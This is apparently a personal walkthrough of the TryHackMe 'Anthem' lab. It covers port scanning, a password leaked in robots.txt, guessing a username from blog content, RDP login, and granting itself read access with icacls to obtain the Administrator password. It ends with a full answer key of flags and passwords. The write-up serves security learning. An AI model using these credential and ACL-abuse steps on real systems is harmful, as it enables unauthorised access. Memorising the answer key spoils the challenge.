

```markdown
# Anthem — TryHackMe Walkthrough Notes

> Target: 10.48.191.46
> Host: WIN-LU09299160F
> OS: Windows Server 2019 (10.0.17763)
> Attacker: Kali (tun0)
> Date: 26 Nov 2026

---

## 1. Recon

### Ping failed but host is alive
```bash
ping -c 2 -W 2 10.48.191.46
# 100% packet loss — ICMP filtered, not dead
```

### Targeted scan
```bash
nmap -Pn -p 80,3389,5985 --open 10.48.191.46 -T4
```

```
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
```

### Full TCP scan
```bash
nmap -Pn -p- -T4 --open 10.48.191.46 -oN ports.txt
```

```
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
```

**Key point:** Everything except 80/3389 is `filtered` (no-response), not closed. No SMB (445), no RPC (135), no NetBIOS (139), no WinRM (5985). No MS17-010 path, no evil-winrm. Intended path = web → creds → RDP.

### Service detection
```bash
nmap -Pn -sV -p 80,3389 -T4 \
  --script=http-title,http-robots.txt,rdp-ntlm-info 10.48.191.46
```

- Port 80: `Microsoft HTTPAPI httpd 2.0`, title **"Anthem.com - Welcome to our blog"**, robots.txt disallows `/bin/ /config/ /umbraco/ /umbraco_client/` → **Umbraco CMS**
- Port 3389: cert CN `WIN-LU09299160F`, `Product_Version: 10.0.17763` → Windows Server 2019

---

## 2. Web Enumeration

### robots.txt — password leak
```bash
curl -s http://10.48.191.46/robots.txt
```

```
UmbracoIsTheBest!

User-agent: *
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
```

- **Password:** `UmbracoIsTheBest!`
- **CMS:** Umbraco

### Blog posts — username OSINT
- `"We are hiring"` → `JD@anthem.com`, author **Jane Doe**
- `"A cheers to our IT department"` → poem = **Solomon Grundy** nursery rhyme → admin name = **Solomon Grundy**

Email convention: first initial + last initial @anthem.com
→ **`SG@anthem.com`** → Windows username **`SG`**

> Red herring: "Author: James Orchard Halliwell" on the poem post (folklorist, not the admin).

### Directory brute force
```bash
gobuster dir -u http://10.48.191.46/ \
  -w /usr/share/wordlists/dirb/common.txt -t 30
```

Notable: `/archive`, `/authors`, `/install` → 302 `/umbraco/`, `/umbraco`, `/robots.txt`, `/rss`, `/sitemap`, `/tags`

### Flags in source
```bash
grep -hoiE 'THM\{[^}]*\}' *.html | sort -u
```

```
THM{AN0TH3R_M3TA}
THM{G!T_G00D}
THM{L0L_WH0_D15}
THM{L0L_WH0_US3S_M3T4}
```

| Flag | Location |
|---|---|
| `THM{L0L_WH0_US3S_M3T4}` | `/archive/we-are-hiring/` → `og:description` meta |
| `THM{G!T_G00D}` | Homepage → search input `placeholder` |
| `THM{L0L_WH0_D15}` | `/authors` → Jane Doe "Website:" field (visible) |
| `THM{AN0TH3R_M3TA}` | `/archive/a-cheers-to-our-it-department/` → `og:description` meta |

---

## 3. Initial Access — RDP as SG

**Creds:** `SG` : `UmbracoIsTheBest!` (box not domain-joined)

### Auth-only test
```bash
xfreerdp3 /v:10.48.191.46 /u:SG /p:'UmbracoIsTheBest!' \
  /cert:ignore +auth-only
```

- No `ERRCONNECT_LOGON_FAILURE` = valid
- Wrong password returns `ERRCONNECT_LOGON_FAILURE`
- Case matters (`umbracoisthebest!` fails)

### Full session with drive redirection
```bash
xfreerdp3 /v:10.48.191.46 /u:SG /p:'UmbracoIsTheBest!' \
  /cert:ignore /size:1280x800 \
  /drive:share,/home/shrdx/Documents/Anthem
```

Inside Windows the share = `\\tsclient\share`

### User flag
```cmd
C:\> whoami
win-lu09299160f\sg

C:\> type C:\Users\SG\Desktop\user.txt
THM{N00T_NO0T}
```

**user.txt = `THM{N00T_NO0T}`**

---

## 4. Privilege Escalation — C:\backup ACL

```cmd
C:\> dir /a C:\
...
05/04/2020  22:42    <DIR>          backup

C:\> dir /a C:\backup
05/04/2020  22:42                21 restore.txt

C:\> type C:\backup\restore.txt
Access is denied.
```

### Check ACL
```cmd
C:\> icacls C:\backup\restore.txt
C:\backup\restore.txt
Successfully processed 1 files; Failed processing 0 files
```

**No ACEs listed** — DACL is empty. But SG has `WRITE_DAC`, so SG can grant itself read. A deny the user can undo is not a control.

### Grant read and read the file
```cmd
C:\> icacls C:\backup\restore.txt /grant %USERNAME%:R
processed file: C:\backup\restore.txt

C:\> type C:\backup\restore.txt
ChangeMeBaby1MoreTime
```

**Administrator password = `ChangeMeBaby1MoreTime`**

> ⚠️ Older writeups list `ChangeMe123!` — this instance uses `ChangeMeBaby1MoreTime`. Always verify on the live box.

GUI equivalent: right-click → Properties → Security → Edit → Add → `SG` → Read → Apply

---

## 5. Root

```bash
xfreerdp3 /v:10.48.191.46 /u:Administrator \
  /p:'ChangeMeBaby1MoreTime' /cert:ignore /size:1280x800 \
  /drive:share,/home/shrdx/Documents/Anthem
```

```cmd
C:\> whoami
win-lu09299160f\administrator

C:\> type C:\Users\Administrator\Desktop\root.txt
THM{Y0U_4R3_1337}
```

**root.txt = `THM{Y0U_4R3_1337}`**

---

## 6. Answer Key

| Question | Answer |
|---|---|
| Web server port | `80` |
| RDP port | `3389` |
| Password in crawler file | `UmbracoIsTheBest!` |
| CMS | `Umbraco` |
| Domain | `anthem.com` |
| Administrator name | `Solomon Grundy` |
| Administrator email | `SG@anthem.com` |
| Flag 1 | `THM{L0L_WH0_US3S_M3T4}` |
| Flag 2 | `THM{G!T_G00D}` |
| Flag 3 | `THM{L0L_WH0_D15}` |
| Flag 4 | `THM{AN0TH3R_M3TA}` |
| Username / password | `SG` / `UmbracoIsTheBest!` |
| user.txt | `THM{N00T_NO0T}` |
| Admin password | `ChangeMeBaby1MoreTime` |
| root.txt | `THM{Y0U_4R3_1337}` |

---

## 7. Vulnerabilities Used

1. Secret in `robots.txt` — OS password readable by bots
2. Secrets in page source — flags in `og:description` meta / form placeholder
3. Password reuse — web CMS + Windows account
4. Exposed RDP — no VPN/allowlist, no MFA
5. Broken file ACL — empty DACL but SG had `WRITE_DAC`
6. Cleartext admin password at rest — `C:\backup\restore.txt`
7. CMS fingerprinting — robots.txt + `/install` redirect + `/umbraco` back office
8. OSINT from blog content — poem + email convention = username

---

## 8. Dead Ends

- `ping` 100% loss → ICMP filtered, fixed with `-Pn`
- First `curl` timeout (exit 28) → slow server, longer `--max-time`
- All ports except 80/3389 filtered → no SMB/MS17-010, no WinRM
- `/umbraco` login not needed — flags in public HTML
- SG profile folders empty; `findstr "ChangeMe"` found nothing
- `Web.config` → Umbraco SQL CE DB, no cleartext creds
- `C:\Users\Administrator\Desktop` inaccessible as SG
- FreeRDP `/shell:cmd.exe` didn't work → `Win+R → cmd.exe`
- James Orchard Halliwell = red herring, not the admin

---

## 9. Takeaways

- Always `-Pn` on lab networks
- "Filtered" ≠ "closed" — map what doesn't exist
- robots.txt is recon AND a password leak
- Read the source — meta tags, placeholders, comments
- Blog/team content is OSINT
- Empty DACL isn't safe if low-priv user has WRITE_DAC
- Check backup folders at root of C:
- Verify answers against live target, not writeups
- Write down dead ends — they save time
```
DETAIL NOTES AND WALKTHORUGH AVAIALABLE IN MEDIUM AND ALSO IN THE ABOOVE REPO AS ADVANCED WALKTHROUGH NAMED.
MEDIUM-https://medium.com/@sharatsunnithan3/tryhackme-anthem-from-web-enumeration-to-windows-administrator-49193ec6e72c
